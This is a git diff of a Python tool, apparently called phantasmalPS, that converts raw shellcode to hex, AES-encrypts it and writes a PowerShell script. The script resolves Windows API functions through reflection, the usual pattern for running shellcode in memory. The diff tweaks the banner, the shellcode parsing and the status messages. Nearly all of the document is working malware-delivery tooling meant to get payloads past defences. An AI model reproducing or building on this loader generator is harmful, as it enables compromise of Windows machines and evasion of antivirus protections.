@@ -5,14 +5,22 @@ import os
 import sys
 import argparse
 
-print(r"""
-         _                    _                                _   ___   ___ 
-  _ __  | |_    __ _   _ _   | |_   __ _   ___  _ __    __ _  | | | _ \ / __|
- | '_ \ | ' \  / _` | | ' \  |  _| / _` | (_-< | '  \  / _` | | | |  _/ \__ \
- | .__/ |_||_| \__,_| |_||_|  \__| \__,_| /__/ |_|_|_| \__,_| |_| |_|   |___/
- |_|                                                                         
- 
- """)
+def banner(result):
+	message = r"""
+	
+
+.______    __    __       ___      .__   __. .___________.    ___           _______..___  ___.      ___       __      .______     _______.
+|   _  \  |  |  |  |     /   \     |  \ |  | |           |   /   \         /       ||   \/   |     /   \     |  |     |   _  \   /       |
+|  |_)  | |  |__|  |    /  ^  \    |   \|  | `---|  |----`  /  ^  \       |   (----`|  \  /  |    /  ^  \    |  |     |  |_)  | |   (----`
+|   ___/  |   __   |   /  /_\  \   |  . `  |     |  |      /  /_\  \       \   \    |  |\/|  |   /  /_\  \   |  |     |   ___/   \   \    
+|  |      |  |  |  |  /  _____  \  |  |\   |     |  |     /  _____  \  .----)   |   |  |  |  |  /  _____  \  |  `----.|  |   .----)   |   
+| _|      |__|  |__| /__/     \__\ |__| \__|     |__|    /__/     \__\ |_______/    |__|  |__| /__/     \__\ |_______|| _|   |_______/    
+                                                                                                                                          
+
+"""
+	message += result
+	print(message)
+	 
 
 def create_key():
     key = os.urandom(16)  # 16 bytes for AES-128
@@ -20,9 +28,9 @@ def create_key():
     return cipher, key
 
 def read_shellcode(file):
-    with open(file, "r") as data:
-        shellcode = data.readline().replace("[Byte[]] $buf = ","")
-    return shellcode
+    with open(file, "rb") as data:
+        shellcode = ["{0:#0{1}x}".format(int(x),4) for x in data.read()]
+    return ','.join(str(i) for i in shellcode)
 
 def aes_encrypt(file):
     cipher, key = create_key()
@@ -42,14 +50,14 @@ def main():
 
     template = '''function LookupFunc {
 
-	Param ($moduleName, $functionName)
+    Param ($moduleName, $functionName)
 
-	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
     Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
       Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
     $tmp=@()
     $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
-	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
     }
 
     function getDelegateType {
@@ -104,7 +112,10 @@ def main():
 
     '''
     with open("simplescript.ps1", "w") as ps:
-        ps.write(template)
+        if ps.write(template):
+            banner(result = "[+] PowerShell script has been successfully generated!\n")
+        else:
+            banner(result = "[-] Something went wrong!\n")
 
 if __name__ == "__main__":
     main()
